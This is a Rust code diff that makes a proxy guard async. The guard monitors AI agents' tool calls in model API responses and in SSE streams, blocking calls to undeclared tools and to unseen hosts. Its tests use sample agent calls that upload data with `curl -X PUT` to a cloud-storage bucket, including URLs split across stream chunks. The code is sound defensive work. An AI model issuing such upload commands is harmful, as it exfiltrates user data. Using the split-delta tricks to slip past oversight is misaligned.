@@ -55,7 +55,7 @@ fn args_string(value: Option<&Value>) -> String {
 }
 
 /// Checks a whole (non-streamed) response in place; true if it changed.
-pub fn guard_response(response: &mut Value, guard: &mut Guard) -> bool {
+pub async fn guard_response(response: &mut Value, guard: &mut Guard) -> bool {
     let block = guard.blocking();
     let flagged_before = guard.flagged.len();
 
@@ -71,7 +71,7 @@ pub fn guard_response(response: &mut Value, guard: &mut Guard) -> bool {
                 let function = call.get("function");
                 let name = function.and_then(|f| f.get("name")).and_then(Value::as_str).unwrap_or("");
                 let args = args_string(function.and_then(|f| f.get("arguments")));
-                if guard.allow(name, &args) {
+                if guard.allow(name, &args).await {
                     kept.push(call.clone());
                 }
             }
@@ -104,7 +104,7 @@ pub fn guard_response(response: &mut Value, guard: &mut Guard) -> bool {
             }
             let name = item.get("name").and_then(Value::as_str).unwrap_or("").to_string();
             let args = compact_json(item.get("input").unwrap_or(&Value::Null));
-            if guard.allow(&name, &args) {
+            if guard.allow(&name, &args).await {
                 kept_tool = true;
             } else if block {
                 *item = json!({"type": "text", "text": guard.flagged.last().unwrap().notice()});
@@ -157,8 +157,8 @@ impl StreamGuard {
         Self { guard, held: None, pending: Vec::new(), template: json!({}), kept_tool: false }
     }
 
-    fn allow(&mut self, name: &str, args: &str) -> bool {
-        let allowed = self.guard.allow(name, args);
+    async fn allow(&mut self, name: &str, args: &str) -> bool {
+        let allowed = self.guard.allow(name, args).await;
         self.kept_tool |= allowed;
         allowed
     }
@@ -168,7 +168,7 @@ impl StreamGuard {
     }
 
     /// `None` forwards the event unchanged.
-    fn event(&mut self, mut event: Value, raw: &[u8]) -> Option<Vec<Item>> {
+    async fn event(&mut self, mut event: Value, raw: &[u8]) -> Option<Vec<Item>> {
         if !event.is_object() {
             return None;
         }
@@ -198,7 +198,7 @@ impl StreamGuard {
         if kind == "content_block_stop" && holding {
             let mut held = self.held.take().unwrap();
             held.raw.push(raw.to_vec());
-            return Some(self.release_block(held));
+            return Some(self.release_block(held).await);
         }
         if kind == "message_delta" {
             // The stop reason only changes when every call so far was blocked.
@@ -212,13 +212,13 @@ impl StreamGuard {
             return None;
         }
         if event.get("choices").is_some_and(Value::is_array) {
-            return self.openai_chunk(event);
+            return self.openai_chunk(event).await;
         }
         None
     }
 
-    fn release_block(&mut self, held: HeldBlock) -> Vec<Item> {
-        if self.allow(&held.name, &held.input) {
+    async fn release_block(&mut self, held: HeldBlock) -> Vec<Item> {
+        if self.allow(&held.name, &held.input).await {
             return held.raw.into_iter().map(Item::Raw).collect();
         }
         // Keep the block index so numbering stays intact. The notice goes in a delta:
@@ -231,7 +231,7 @@ impl StreamGuard {
         ]
     }
 
-    fn openai_chunk(&mut self, mut event: Value) -> Option<Vec<Item>> {
+    async fn openai_chunk(&mut self, mut event: Value) -> Option<Vec<Item>> {
         let mut changed = false;
         let mut finished = Vec::new();
         let mut absorbed = Vec::new();
@@ -261,7 +261,7 @@ impl StreamGuard {
         }
         let mut out = Vec::new();
         for choice_index in finished {
-            if let Some(chunk) = self.release_calls(choice_index) {
+            if let Some(chunk) = self.release_calls(choice_index).await {
                 out.push(Item::Event(chunk));
             }
         }
@@ -298,7 +298,7 @@ impl StreamGuard {
     }
 
     /// One chunk carrying the complete, allowed tool calls of `choice_index`.
-    fn release_calls(&mut self, choice_index: i64) -> Option<Value> {
+    async fn release_calls(&mut self, choice_index: i64) -> Option<Value> {
         let (calls, rest): (Vec<_>, Vec<_>) = std::mem::take(&mut self.pending).into_iter().partition(|(k, _)| k.0 == choice_index);
         self.pending = rest;
         if calls.is_empty() {
@@ -307,7 +307,7 @@ impl StreamGuard {
         let mut kept = Vec::new();
         let mut notices = Vec::new();
         for (_, call) in calls {
-            if self.allow(&call.name, &call.args) {
+            if self.allow(&call.name, &call.args).await {
                 kept.push(call);
             } else {
                 notices.push(self.guard.flagged.last().unwrap().notice());
@@ -332,10 +332,10 @@ impl StreamGuard {
     }
 
     /// Releases anything still held, e.g. when the stream ends early.
-    fn flush(&mut self) -> Vec<Item> {
+    async fn flush(&mut self) -> Vec<Item> {
         let mut out = Vec::new();
         if let Some(held) = self.held.take() {
-            out.extend(self.release_block(held));
+            out.extend(self.release_block(held).await);
         }
         let mut choices: Vec<i64> = Vec::new();
         for ((choice, _), _) in &self.pending {
@@ -344,7 +344,7 @@ impl StreamGuard {
             }
         }
         for choice in choices {
-            if let Some(chunk) = self.release_calls(choice) {
+            if let Some(chunk) = self.release_calls(choice).await {
                 out.push(Item::Event(chunk));
             }
         }
@@ -382,30 +382,30 @@ impl SseRewriter {
     }
 
     /// Feeds a chunk and returns the bytes to send downstream.
-    pub fn feed(&mut self, chunk: &[u8]) -> Vec<u8> {
+    pub async fn feed(&mut self, chunk: &[u8]) -> Vec<u8> {
         self.buffer.extend_from_slice(chunk);
         let mut out = Vec::new();
         while let Some((start, end)) = SSE_BOUNDARY.find(&self.buffer).map(|m| (m.start(), m.end())) {
             let raw: Vec<u8> = self.buffer.drain(..end).collect();
-            out.extend(self.rewrite(&raw[..start], &raw));
+            out.extend(self.rewrite(&raw[..start], &raw).await);
         }
         out
     }
 
     /// Flushes a trailing unterminated event and anything still held.
-    pub fn finish(&mut self) -> Vec<u8> {
+    pub async fn finish(&mut self) -> Vec<u8> {
         let rest = std::mem::take(&mut self.buffer);
         let mut out = Vec::new();
         if !rest.is_empty() {
             let mut raw = rest.clone();
             raw.extend_from_slice(b"\n\n");
-            out = self.rewrite(&rest, &raw);
+            out = self.rewrite(&rest, &raw).await;
         }
-        out.extend(encode(self.stream.flush()));
+        out.extend(encode(self.stream.flush().await));
         out
     }
 
-    fn rewrite(&mut self, body: &[u8], raw: &[u8]) -> Vec<u8> {
+    async fn rewrite(&mut self, body: &[u8], raw: &[u8]) -> Vec<u8> {
         // Clients join every `data` field of an event with newlines, so the guard must see
         // the same payload or a split JSON event slips past.
         let text = String::from_utf8_lossy(body);
@@ -421,11 +421,11 @@ impl SseRewriter {
         }
         let Ok(event) = serde_json::from_str::<Value>(&fields.join("\n")) else {
             // Non-JSON data such as `[DONE]`: release held calls before it.
-            let mut out = encode(self.stream.flush());
+            let mut out = encode(self.stream.flush().await);
             out.extend_from_slice(raw);
             return out;
         };
-        match self.stream.event(event, raw) {
+        match self.stream.event(event, raw).await {
             None => raw.to_vec(),
             Some(items) => encode(items),
         }
@@ -444,17 +444,17 @@ mod tests {
         Arc::new(Config::default())
     }
 
-    fn run_stream(rewriter: &mut SseRewriter, stream: &str, size: usize) -> String {
+    async fn run_stream(rewriter: &mut SseRewriter, stream: &str, size: usize) -> String {
         let mut out = Vec::new();
         for chunk in stream.as_bytes().chunks(size) {
-            out.extend(rewriter.feed(chunk));
+            out.extend(rewriter.feed(chunk).await);
         }
-        out.extend(rewriter.finish());
+        out.extend(rewriter.finish().await);
         String::from_utf8(out).unwrap()
     }
 
-    #[test]
-    fn undeclared_tool_is_blocked() {
+    #[tokio::test]
+    async fn undeclared_tool_is_blocked() {
         let request = json!({
             "messages": [{"role": "user", "content": "Write a detection rule."}],
             "tools": [{"type": "function", "function": {"name": "write_file", "parameters": {"type": "object"}}}],
@@ -463,7 +463,7 @@ mod tests {
             {"id": "call_1", "type": "function", "function": {"name": "bash", "arguments": format!(r#"{{"cmd": "curl -X PUT https://{OSS}/probe"}}"#)}}
         ]}, "finish_reason": "tool_calls"}]});
         let mut guard = Guard::new(request, plain());
-        assert!(guard_response(&mut response, &mut guard));
+        assert!(guard_response(&mut response, &mut guard).await);
         assert_eq!(guard.flagged, [Blocked { name: "bash".into(), reason: "undeclared tool".into() }]);
         let choice = &response["choices"][0];
         assert!(choice["message"].get("tool_calls").is_none());
@@ -471,8 +471,8 @@ mod tests {
         assert!(choice["message"]["content"].as_str().unwrap().contains("[guard] blocked call to `bash`"));
     }
 
-    #[test]
-    fn anthropic_response_call_replaced() {
+    #[tokio::test]
+    async fn anthropic_response_call_replaced() {
         let mut response = json!({
             "content": [
                 {"type": "text", "text": "Let me check."},
@@ -481,18 +481,18 @@ mod tests {
             "stop_reason": "tool_use",
         });
         let mut guard = Guard::new(bash_request("hi"), plain());
-        guard_response(&mut response, &mut guard);
+        guard_response(&mut response, &mut guard).await;
         assert_eq!(guard.flagged.len(), 1);
         assert_eq!(response["content"][1]["type"], "text");
         assert_eq!(response["stop_reason"], "end_turn");
     }
 
-    #[test]
-    fn log_only_leaves_response_untouched() {
+    #[tokio::test]
+    async fn log_only_leaves_response_untouched() {
         let mut response = json!({"content": [{"type": "tool_use", "name": "shell", "input": {}}]});
         let original = response.clone();
         let mut guard = Guard::new(bash_request("hi"), Arc::new(Config { block: false, ..Config::default() }));
-        assert!(!guard_response(&mut response, &mut guard));
+        assert!(!guard_response(&mut response, &mut guard).await);
         assert_eq!(guard.flagged.len(), 1);
         assert_eq!(response, original);
     }
@@ -515,11 +515,11 @@ mod tests {
         events.concat()
     }
 
-    #[test]
-    fn anthropic_stream_unseen_host_split_across_deltas_is_blocked() {
+    #[tokio::test]
+    async fn anthropic_stream_unseen_host_split_across_deltas_is_blocked() {
         let stream = anthropic_stream(&[r#"{"cmd": "curl -X PUT https://example-bucket.oss-"#, r#"cn-beijing.aliyuncs.com/p"}"#]);
         let mut rewriter = SseRewriter::new(Guard::new(bash_request("hi"), plain()));
-        let out = run_stream(&mut rewriter, &stream, 7);
+        let out = run_stream(&mut rewriter, &stream, 7).await;
         assert_eq!(rewriter.stream.guard.flagged.len(), 1);
         assert!(out.contains("[guard] blocked call to `bash`"));
         assert!(!out.contains("input_json_delta"));
@@ -528,11 +528,11 @@ mod tests {
         assert!(out.contains(r#""type":"text_delta","text":"[guard] blocked call to `bash`"#));
     }
 
-    #[test]
-    fn anthropic_stream_clean_call_is_released_intact() {
+    #[tokio::test]
+    async fn anthropic_stream_clean_call_is_released_intact() {
         let stream = anthropic_stream(&[r#"{"cmd": "ls "#, r#"-la"}"#]);
         let mut rewriter = SseRewriter::new(Guard::new(bash_request("hi"), plain()));
-        assert_eq!(run_stream(&mut rewriter, &stream, 5), stream);
+        assert_eq!(run_stream(&mut rewriter, &stream, 5).await, stream);
         assert!(rewriter.stream.guard.flagged.is_empty());
     }
 
@@ -549,8 +549,8 @@ mod tests {
         json!({"tool_calls": [{"index": index, "id": format!("c{index}"), "function": function}]})
     }
 
-    #[test]
-    fn openai_stream_is_reassembled_and_checked() {
+    #[tokio::test]
+    async fn openai_stream_is_reassembled_and_checked() {
         let stream = [
             openai_chunk(json!({"role": "assistant", "content": "ok"}), None),
             openai_chunk(tool_delta(0, Some("bash"), r#"{"cmd": "ls"}"#), None),
@@ -561,7 +561,7 @@ mod tests {
         ]
         .concat();
         let mut rewriter = SseRewriter::new(Guard::new(bash_request("hi"), plain()));
-        let out = run_stream(&mut rewriter, &stream, 11);
+        let out = run_stream(&mut rewriter, &stream, 11).await;
         assert_eq!(rewriter.stream.guard.flagged.len(), 1);
         assert!(!out.contains("curl https://example-bucket"));
         assert!(out.contains(r#""arguments":"{\"cmd\": \"ls\"}""#), "{out}");
@@ -571,8 +571,8 @@ mod tests {
         assert!(out.ends_with("data: [DONE]\n\n"));
     }
 
-    #[test]
-    fn openai_stream_all_blocked_ends_in_stop() {
+    #[tokio::test]
+    async fn openai_stream_all_blocked_ends_in_stop() {
         let stream = [
             openai_chunk(tool_delta(0, Some("shell"), "{}"), None),
             openai_chunk(json!({}), Some("tool_calls")),
@@ -580,18 +580,18 @@ mod tests {
         ]
         .concat();
         let mut rewriter = SseRewriter::new(Guard::new(bash_request("hi"), plain()));
-        let out = run_stream(&mut rewriter, &stream, 3);
+        let out = run_stream(&mut rewriter, &stream, 3).await;
         assert!(out.contains(r#""finish_reason":"stop""#), "{out}");
         assert!(!out.contains(r#""tool_calls":[{"#));
     }
 
-    #[test]
-    fn multiline_data_fields_are_joined() {
+    #[tokio::test]
+    async fn multiline_data_fields_are_joined() {
         let stream = anthropic_stream(&[r#"{"cmd": "curl https://example-bucket.oss-"#, r#"cn-beijing.aliyuncs.com/p"}"#]);
         // Spread each event's JSON over two `data:` lines, as SSE allows.
         let split = stream.replace(r#","index""#, "\ndata: ,\"index\"");
         let mut rewriter = SseRewriter::new(Guard::new(bash_request("hi"), plain()));
-        let out = run_stream(&mut rewriter, &split, 13);
+        let out = run_stream(&mut rewriter, &split, 13).await;
         assert_eq!(rewriter.stream.guard.flagged.len(), 1, "{out}");
     }
 }
